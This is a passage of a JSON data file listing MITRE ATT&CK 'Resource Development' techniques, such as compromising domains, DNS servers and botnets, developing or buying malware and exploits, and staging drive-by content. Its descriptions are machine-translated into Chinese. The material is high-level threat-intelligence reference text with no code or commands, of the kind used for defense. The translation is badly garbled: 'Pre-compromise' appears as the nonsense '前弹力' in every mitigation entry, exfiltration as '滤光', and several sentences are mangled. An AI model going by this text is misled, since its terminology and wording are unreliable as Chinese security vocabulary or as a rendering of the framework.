        "name": "Resource Development"
      }
    ],
    "technique": "Compromise Accounts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会损害可以在目标期间使用的云帐户。对手可以使用折衷的云帐户来进一步操作，包括利用云存储服务，例如Dropbox，Microsoft OneDrive或AWS S3存储桶，用于去滤光到云存储或上传工具。云帐户也可以用于采集基础架构，例如虚拟专用服务器或无服务器基础架构。妥协的云帐户可能会使对手能够在不管理自己的服务器的情况下开发复杂的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "存在多种方法用于损害云帐户，例如通过网络钓鱼收集凭据以获取信息，从第三方站点购买凭据，进行密码喷涂攻击或试图窃取应用程序访问令牌。在妥协云帐户之前，对手可能会进行侦察，以告知关于哪些账户要妥协以进一步运营的决定。在某些情况下，对手可能会针对特权服务提供商帐户，目的是利用服务提供商与其客户之间的可信赖关系。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1584.001",
    "name": "Domains",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Compromise Infrastructure",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会劫持可以在目标期间使用的域和/或子域。域名注册劫持是未经原始注册人许可更改域名注册的行为。对手可能可以访问列为该域名所有者的人的电子邮件帐户。然后，对手可以声称他们忘记了密码以更改域注册。其他可能性包括社会工程域名注册服务台，以访问帐户或利用更新过程差距。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当组织的DNS条目指向不存在或剥夺资源时，可能会发生子域劫持。在这种情况下，对手可以控制子域以与该领域相关的信任的利益进行操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "损害域的对手也可能通过在其控制下创建恶意子域而在保留任何现有DNS记录的同时，从而参与域名。由于服务不会被破坏，因此很长一段时间的恶意子域可能不会引起人们的注意。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1584.002",
    "name": "DNS Server",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Compromise Infrastructure",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会损害可以在目标期间使用的第三方DNS服务器。在副业后活动期间，对手可以将DNS流量用于各种任务，包括命令和控制（例如：应用程序层协议）。对手无需设置自己的DNS服务器，而是可能损害第三方DNS服务器以支持操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过损害DNS服务器，对手可以改变DNS记录。这种控制可以使组织的流量重定向，促进对手的收集和凭证访问工作。此外，对手可以利用与数字证书结合使用的控制权将流量重定向到对手控制的基础架构，从而模仿正常可信赖的网络通信。对手也可能能够默默创建指向恶意服务器的子域，而无需削减DNS服务器的实际所有者。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1584.003",
    "name": "Virtual Private Server",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Compromise Infrastructure",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会损害可以在目标期间使用的第三方虚拟私人服务器（VPS）。有各种各样的云服务提供商将出售虚拟机/容器作为服务。对手可能会损害第三方实体购买的VPS。通过妥协将VP用作基础设施，对手可能会使自己很难将操作与自己联系起来。"
        }
      ],
      [
        {
          "type": "text",
          "content": "妥协在对手生命周期的后期阶段使用的VP，例如命令和控制，可以使对手能够从与较高信誉云服务提供商以及受损的第三方添加的无处不在和信任中受益。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1584.004",
    "name": "Server",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Compromise Infrastructure",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会损害可以在目标期间使用的第三方服务器。使用服务器的使用使对手可以上台，启动和执行操作。在副业后活动期间，对手可以使用服务器进行各种任务，包括命令和控制。对手无需购买服务器或虚拟专用服务器，而是会损害第三方服务器以支持操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能还会妥协Web服务器，以支持驱动器折衷方案或电子邮件服务器以支持网络钓鱼操作，以支持浇水孔操作。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1584.005",
    "name": "Botnet",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Compromise Infrastructure",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会损害许多第三方系统，以形成可以在靶向过程中使用的僵尸网络。僵尸网络是一个妥协的系统网络，可以指示执行协调的任务。对手可以通过损害众多第三方系统来建立自己的僵尸网络，而不是从靴子/压力器服务购买/租用僵尸网络。对手也可以对现有的僵尸网络进行接管，例如将机器人重定向到对手控制的C2服务器。借助僵尸网络，对手可以执行后续活动，例如大规模的网络钓鱼或分布式拒绝服务（DDOS）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1584.006",
    "name": "Web Services",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Compromise Infrastructure",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会损害对目标过程中可以使用的第三方Web服务的访问。存在各种流行的网站供合法用户注册基于Web的服务，例如GitHub，Twitter，Dropbox，Google，Sendgrid等。对手可能会尝试将合法用户对Web服务的访问权限拥有并使用该Web服务作为支持网络运营的基础设施。在对手生命周期的后期，例如在命令和控制（Web服务），Web服务上的渗透或网络钓鱼时，可以滥用此类Web服务。使用常见服务（例如Google或Twitter提供的服务），使对手更容易隐藏在预期的噪音中。通过利用Web服务，尤其是在合法用户被盗时访问时，对手可能会使他们很难将操作与他们进行物理上的操作。此外，利用受感染的基于Web的电子邮件服务可能使对手能够利用与合法域相关的信任。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1584.007",
    "name": "Serverless",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Compromise Infrastructure",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会损害无服务器的云基础架构，例如Cloudflare工人或AWS Lambda功能，可以在目标期间使用。通过利用无服务器基础结构，对手可以使操作过程中使用的基础架构更加困难。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一旦妥协，可以利用无服务器的运行时环境直接响应受感染的机器或代理对手拥有的命令和控制服务器。由于这些功能产生的流量似乎来自普通云提供商的子域，因此可能很难与普通流量区分开到这些提供商。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1587.001",
    "name": "Malware",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Develop Capabilities",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会开发针对目标期间可以使用的恶意软件和恶意软件组件。构建恶意软件可以包括开发有效载荷，滴管，后磁后工具，后门（包括后部图像），包装工，C2协议以及创建受感染的可移动媒体。对手可能会开发恶意软件来支持其操作，创造一种用于维持远程机器控制，逃避防御和执行后弹力行为的手段。"
        }
      ],
      [
        {
          "type": "text",
          "content": "与合法的开发工作一样，开发恶意软件可能需要不同的技能。所需的技能可能位于内部，或者可能需要签约。如果对手在塑造需求中发挥作用并保持对恶意软件的排他性，则可以将承包商的使用视为对手恶意软件开发能力的扩展。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意软件开发的某些方面，例如C2协议开发，可能需要对手才能获得其他基础架构。例如，开发的恶意软件将与Twitter进行C2通信，可能需要使用Web服务。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1587.002",
    "name": "Code Signing Certificates",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Develop Capabilities",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会创建可以在目标期间使用的自签名代码签名证书。代码签名是数字签名可执行文件和脚本以确认软件作者的过程，并确保尚未更改或损坏代码。代码签名为开发人员提供的程序提供了一定的真实性，并保证该程序尚未篡改。用户和/或安全工具可能会信任签名的代码，而不是未签名的代码，即使他们不知道是谁发布了证书或作者是谁。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在代码签名之前，对手可能会开发自签名的代码签名证书以用于操作。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1587.003",
    "name": "Digital Certificates",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Develop Capabilities",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会创建可以在定位期间使用的自签名的SSL/TLS证书。SSL/TLS证书旨在灌输信任。它们包括有关密钥的信息，有关其所有者身份的信息以及已验证证书内容的实体的数字签名是正确的。如果签名有效，并且检查证书的人信任签名者，则他们知道他们可以使用该钥匙与其所有者进行通信。在自我签名的情况下，数字证书将缺乏与第三方证书授权（CA）签名相关的信任元素。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会创建可用于进一步操作的自签名的SSL/TLS证书，例如加密C2流量（例如：使用Web协议的非对称加密术），甚至启用中间人，如果添加到中间的对手，（即安装根证书）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "创建数字证书后，对手可以在其控制下的基础架构上安装该证书（请参阅安装数字证书）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1587.004",
    "name": "Exploits",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Develop Capabilities",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会开发可在目标期间使用的漏洞。利用利用错误或漏洞，以使计算机硬件或软件上发生意外或意外行为。对手可以开发自己的利用，而不是从在线查找/修改利用或从漏洞供应商那里购买它们。对手可以使用通过漏洞获得的信息来集中利用开发工作。作为利用开发过程的一部分，对手可以通过诸如模糊和补丁分析等方法发现可剥削的脆弱性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "与合法的开发工作一样，开发利用可能需要不同的技能。所需的技能可能位于内部，或者可能需要签约。承包商的使用可以被视为对对手的开发发展能力的扩展，前提是对手在塑造需求中发挥作用并保持对利用的初始排他性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在对手生命周期的各个阶段使用利用（即开发公共面向公共的申请，对客户执行的利用，用于特权升级的利用，防御逃避剥削，利用凭证的利用，远程访问的利用，远程服务的利用以及应用程序或系统剥削）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1585.001",
    "name": "Social Media Accounts",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Establish Accounts",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会创建和培养可以在定位期间使用的社交媒体帐户。对手可以创建社交媒体帐户，可用于建立角色以进一步运营。角色发展包括开发公共信息，存在，历史和适当的隶属关系。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对于结合社会工程的运营，社交媒体上角色的利用可能很重要。这些角色可能是虚构的，也可能是真实的人。角色可能存在于单个社交媒体网站或跨多个站点（例如：Facebook，LinkedIn，Twitter等）。在社交媒体上建立角色可能需要开发其他文档，以使其看起来真实。这可能包括填写个人资料信息，开发社交网络或合并照片。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一旦发展了角色，对手就可以使用它来建立与感兴趣的目标的联系。这些连接可能是直接的，也可能包括尝试通过其他人连接。这些帐户可以在对手生命周期的其他阶段（例如在初始访问期间（例如：通过服务）进行）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1585.002",
    "name": "Email Accounts",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Establish Accounts",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会创建可以在定位期间使用的电子邮件帐户。对手可以使用使用电子邮件提供商创建的帐户来进一步操作，例如利用他们进行网络钓鱼以获取信息或网络钓鱼。对手也可能采取步骤来培养电子邮件帐户的角色，例如使用社交媒体帐户，以增加成功行为的成功机会。创建的电子邮件帐户也可以用于采集基础架构（例如：域）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了减少将操作与自己绑架的机会，对手可能会利用一次性电子邮件服务。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1585.003",
    "name": "Cloud Accounts",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Establish Accounts",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会与云提供商创建帐户，这些帐户可以在定位期间使用。对手可以使用云帐户来进一步操作，包括利用云存储服务，例如Dropbox，Mega，Microsoft OneDrive或AWS S3存储桶以进行滤光到云存储或上传工具。云帐户也可以用于采集基础架构，例如虚拟专用服务器或无服务器基础架构。建立云帐户可能会使对手能够在不管理自己的服务器的情况下开发复杂的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "创建云帐户还可能需要对手建立电子邮件帐户以向云提供商注册。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1588.001",
    "name": "Malware",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Obtain Capabilities",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会购买，窃取或下载可在目标期间使用的恶意软件。恶意软件可以包括有效载荷，滴管，后磁后工具，后门，包装工和C2协议。对手可以获取恶意软件以支持其操作，获得一种维持远程机器控制，逃避防御和执行后弹力行为的手段。"
        }
      ],
      [
        {
          "type": "text",
          "content": "除了从互联网下载免费的恶意软件外，对手还可以从第三方实体购买这些功能。第三方实体可以包括专门从事恶意软件开发，犯罪市场（包括恶意软件 - 服务或MAAS）或个人的技术公司。除了购买恶意软件外，对手可能还会从第三方实体（包括其他对手）窃取和重新利用恶意软件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1588.002",
    "name": "Tool",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Obtain Capabilities",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会购买，窃取或下载可以在目标期间使用的软件工具。工具可以是开放或封闭的，免费的或免费的。对手可以将工具用于恶意目的，但（与恶意软件不同）无意用于这些目的（例如：PSEXEC）。工具采集可能涉及商业软件许可证的采购，包括用于钴罢工等红色小组工具。可以通过购买，窃取许可（或软件的许可副本）或破解试用版本来获得商业软件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以获得支持其操作的工具，包括支持执行后促进行为。除了自由下载或购买软件外，对手还可能从第三方实体（包括其他对手）窃取软件和/或软件许可。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1588.003",
    "name": "Code Signing Certificates",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Obtain Capabilities",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以购买和/或窃取目标期间可以使用的代码签名证书。代码签名是数字签名可执行文件和脚本以确认软件作者的过程，并确保尚未更改或损坏代码。代码签名为开发人员提供的程序提供了一定的真实性，并保证该程序尚未篡改。用户和/或安全工具可能会信任签名的代码，而不是未签名的代码，即使他们不知道是谁发布了证书或作者是谁。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在代码签名之前，对手可能会购买或窃取用于操作的代码签名证书。购买代码签名证书可以使用前台组织或使用先前妥协的实体偷窃的信息完成，该实体允许对手验证证书提供商作为该实体。对手也可能直接从受损的第三方窃取代码签名材料。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1588.004",
    "name": "Digital Certificates",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Obtain Capabilities",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以购买和/或窃取目标期间可以使用的SSL/TLS证书。SSL/TLS证书旨在灌输信任。它们包括有关密钥的信息，有关其所有者身份的信息以及已验证证书内容的实体的数字签名是正确的。如果签名有效，并且检查证书的人信任签名者，则他们知道他们可以使用该钥匙与其所有者进行通信。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以购买或窃取SSL/TLS证书以进一步进一步操作，例如加密C2流量（例如：使用Web协议的非对称加密术），甚至在信任证书或其他方式添加到中间的对手中，甚至可以启用中间人信任（即安装根证书）。购买数字证书可以使用前台组织进行，也可以使用从先前受损的实体中偷走的信息来完成，这使对手可以验证证书提供商作为该实体。对手也可以直接从折衷的第三方窃取证书材料，包括证书机构。对手可以注册或劫持域，他们以后将购买SSL/TLS证书。"
        }
      ],
      [
        {
          "type": "text",
          "content": "存在允许对手免费获得SSL/TLS证书（例如域验证证书）的证书机构。"
        }
      ],
      [
        {
          "type": "text",
          "content": "获得数字证书后，对手可以在其控制下的基础架构上安装该证书（请参阅安装数字证书）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1588.005",
    "name": "Exploits",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Obtain Capabilities",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会购买，窃取或下载可以在目标期间使用的利用。利用利用错误或漏洞，以使计算机硬件或软件上发生意外或意外行为。对手可能不会开发自己的利用，而是可以从在线上找到/修改利用或从利用供应商那里购买。"
        }
      ],
      [
        {
          "type": "text",
          "content": "除了从Internet下载免费漏洞利用外，对手还可以从第三方实体购买利用。第三方实体可以包括专门利用开发，犯罪市场（包括利用工具包）或个人的技术公司。除了购买漏洞外，对手可能还会从第三方实体（包括其他对手）窃取和重新利用利用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以监视利用提供商论坛，以了解现有的以及新发现的利用的状态。通常，发现利用和公开何时会有延迟。对手可能会针对已知进行开发研究和开发的人的系统，以便在随后的操作中获取该知识以供使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在对手生命周期的各个阶段使用漏洞（即开发公共面向公共的申请，对客户执行的利用，对特权升级的利用，防御逃避剥削，利用凭证的利用，用于凭证访问的利用，远程服务的利用以及应用程序或系统剥削）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1588.006",
    "name": "Vulnerabilities",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Obtain Capabilities",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获取有关靶向过程中可以使用的漏洞的信息。漏洞是计算机硬件或软件的弱点，可能会被对手利用，以导致意外或意外行为发生。对手可以通过搜索打开数据库或获得封闭漏洞数据库来找到漏洞信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以监视漏洞披露/数据库，以了解现有的以及新发现的漏洞的状态。通常，发现漏洞和公开漏洞之间存在延迟。对手可以针对已知进行脆弱性研究（包括商业供应商）的系统的系统。对脆弱性的了解可能会导致对手搜索现有的利用（即利用）或尝试自己开发一个人（即利用）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1608.001",
    "name": "Upload Malware",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Stage Capabilities",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将恶意软件上传到第三方或对手控制的基础架构，以使其在目标过程中可访问。恶意软件可以包括有效载荷，滴管，后磁后工具，后门和各种恶意内容。对手可以上传恶意软件以支持其操作，例如，通过将其放置在Internet可访问的Web服务器上，可以向受害者网络提供有效载荷以启用Intress工具转移。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意软件可能会放置在以前由对手购买/租用的基础架构上（获取基础架构），或者以其他方式被其妥协（妥协基础架构）妥协。恶意软件也可以在Web服务（例如GitHub或Pastebin）上上演，也可以在行星际文件系统（IPFS）上托管，在该服务中，分散的内容存储使其难以删除恶意文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以上传后置文件，例如应用程序二进制文件，虚拟机映像或容器图像，将其上传到第三方软件商店或存储库（例如：Github，CNET，CNET，AWS社区AMIS，Docker Hub）。偶然地遇到，受害者可以通过用户执行直接下载/安装这些后门文件。伪装可能会增加用户错误地执行这些文件的机会。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1608.002",
    "name": "Upload Tool",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Stage Capabilities",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将工具上传到第三方或对手控制的基础架构，以使其在目标过程中可访问。工具可以是开放或封闭的，免费的或免费的。工具可用于恶意目的，但（与恶意软件不同）无意用于这些目的（例如：PSEXEC）。对手可以上传工具以支持其操作，例如使受害者网络可用的工具可通过将其放置在Internet访问的Web服务器上来启用Intress工具传输。"
        }
      ],
      [
        {
          "type": "text",
          "content": "工具可以放置在以前由对手购买/租用的基础架构上（采购基础架构），或者以其他方式遭到了基础设施（妥协基础架构）的妥协。工具也可以在Web服务上上演，例如对手控制的GitHub存储库，也可以在平台为即服务产品上，使用户能够轻松提供应用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过折衷的受害者机器直接从第三方托管位置下载工具来避免上传工具（例如：非对手受控的GitHub repo），包括该工具的原始托管站点。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1608.003",
    "name": "Install Digital Certificate",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Stage Capabilities",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以安装目标期间可以使用的SSL/TLS证书。SSL/TLS证书是可以在服务器上安装的文件，以启用系统之间的安全通信。数字证书包括有关密钥的信息，有关其所有者身份的信息以及已验证证书内容的实体的数字签名是正确的。如果签名有效，并且检查证书的人信任签名者，则他们知道他们可以使用该钥匙与其所有者安全通信。可以将证书上传到服务器，然后可以将服务器配置为使用证书以启用使用该证书的通信。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以安装可用于进一步操作的SSL/TLS证书，例如对C2流量进行加密（例如：使用Web协议的非对称加密术）或对凭证收获站点的可信度。可以针对多种服务器类型（包括Web服务器和电子邮件服务器）进行数字证书的安装。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以获取数字证书（请参阅数字证书）或创建自签名证书（请参阅数字证书）。然后可以将数字证书安装在可能已获取（获取基础架构）或先前妥协（妥协基础架构）的对手控制的基础架构上。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1608.004",
    "name": "Drive-by Target",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Stage Capabilities",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以准备一个操作环境，以感染在正常浏览过程中访问网站的系统。端点系统可能会通过浏览到对手控制的站点而受到损害，例如在驱动器中。在这种情况下，用户的Web浏览器通常是针对开发的（通常不需要一旦降落在网站上的任何额外的用户互动），但是对手也可以为非探索行为（例如应用程序访问令牌）设置网站。在进行妥协之前，对手必须为将这些利用提供给浏览到对手控制的站点所需的利用所需的资源。可以在已获得（获取基础架构）或先前妥协（妥协基础架构）上（妥协的基础架构）上进行驱动内容。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以将恶意网络内容（例如JavaScript）上传或注入网站。这可以通过多种方式完成，包括："
        }
      ],
      [
        {
          "type": "list",
          "content": "将恶意脚本插入网页或其他可控的网络内容，例如论坛帖子"
        },
        {
          "type": "list",
          "content": "修改脚本文件从可公开写入的云存储存储桶中提供给网站的文件"
        },
        {
          "type": "list",
          "content": "通过合法的广告提供商（即，恶意）在网站上制作恶意网络广告并购买广告空间"
        }
      ],
      [
        {
          "type": "text",
          "content": "除了分配内容以利用用户的Web浏览器外，“对手”还可以登台脚本脚本以介绍用户的浏览器（如在收集受害者主机信息中），以确保在尝试利用前很容易受到攻击。"
        }
      ],
      [
        {
          "type": "text",
          "content": "被对手妥协并用来进行开车的网站可能是由特定社区（例如政府，特定行业或地区）访问的网站，其目标是基于共享的特定用户或一组用户的目标。兴趣。这种有针对性的活动被称为战略性网络妥协或浇水洞攻击。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会在采购基础架构（域）期间购买类似于合法域的域（例如：同质识别，错别字，不同的顶级域等），以帮助促进逐步折衷。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
